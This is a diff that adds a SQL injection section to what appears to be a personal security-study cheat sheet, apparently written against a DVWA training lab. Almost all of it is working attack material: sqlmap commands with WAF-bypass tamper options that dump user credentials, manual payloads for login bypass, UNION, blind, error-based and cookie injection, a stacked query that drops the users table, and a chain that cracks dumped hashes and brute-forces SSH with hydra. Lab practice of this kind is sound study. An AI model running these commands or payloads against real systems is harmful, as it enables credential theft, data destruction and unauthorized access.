@@ -332,6 +332,77 @@ DROP INDEX idx_username ON users;
 EXPLAIN SELECT * FROM users WHERE username = 'admin';
 ```
 
+## SQL Injection / Application Security
+
+```bash
+# sqlmap — Automated SQL injection detection and exploitation (Day 14)
+sqlmap -u "http://192.0.2.10/dvwa/login.php" --forms --batch --risk=3 --level=5
+sqlmap -u "<url>" --data="username=admin&password=pass&Login=Login" --dbs --batch
+sqlmap -u "<url>" --data="<POST_data>" -D dvwa --tables --batch
+sqlmap -u "<url>" --data="<POST_data>" -D dvwa -T users -C username,password --dump --batch
+sqlmap -u "<url>" --data="<POST_data>" --technique=E --batch  # Error-based only
+sqlmap -u "<url>" --data="<POST_data>" --technique=U --batch  # UNION-based only
+sqlmap -u "<url>" --data="<POST_data>" --technique=T --batch  # Time-based only
+sqlmap -u "<url>" --data="<POST_data>" --tamper=space2comment,between --batch  # WAF bypass
+```
+
+```sql
+-- Manual SQL Injection payloads (Day 14)
+
+-- Authentication bypass
+admin' OR '1'='1
+' OR 1=1-- 
+' OR 1=1/*
+
+-- Time-based blind SQL injection (5 second delay confirms vulnerability)
+admin' AND SLEEP(5)-- 
+
+-- UNION-based injection (extract database version)
+' UNION SELECT user(),database(),version(),@@version_comment-- 
+
+-- Error-based SQL injection (reveals database structure in errors)
+' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- 
+
+-- Determine column count with ORDER BY
+1' ORDER BY 1-- 
+1' ORDER BY 5-- 
+-- When ORDER BY 5 fails but ORDER BY 4 succeeds, column count = 4
+
+-- UNION SELECT with matched column count
+1' UNION SELECT username,password,email,user_id FROM users-- 
+
+-- Extract from information_schema (MySQL metadata)
+1' UNION SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,4 FROM information_schema.COLUMNS-- 
+
+-- Cookie-based SQL injection
+-- Cookie: PHPSESSID=1' UNION SELECT user(),database(),version(),4-- 
+-- The application passes unvalidated cookies to SQL queries
+
+-- Stacked queries (multiple statements, if supported)
+admin'; DROP TABLE users; INSERT INTO test VALUES (1); -- 
+```
+
+```bash
+# Integration workflow: sqlmap + hash-id + hydra (Day 14)
+
+# Step 1: Extract hashes via sqlmap
+sqlmap -u "http://192.0.2.10/dvwa/login.php" \
+  --data="username=admin&password=pass&Login=Login" \
+  -D dvwa -T users -C password --dump --batch > hashes.txt
+
+# Step 2: Identify hash type
+hash-id < hashes.txt
+# Alternative: hash-identifier (interactive)
+
+# Step 3: Crack hashes with hashcat or dictionary attack
+hashcat -m 0 hashes.txt ~/wordlists/rockyou.txt
+
+# Step 4: Use cracked credentials with hydra
+hydra -l admin -P ./cracked_passwords.txt 192.0.2.10 ssh -t 4 -V
+
+# Result: SQL Injection → Hash Extraction → Hash Crack → Elevated Access
+```
+
 ## Offensive / Red Team
 
 ```bash
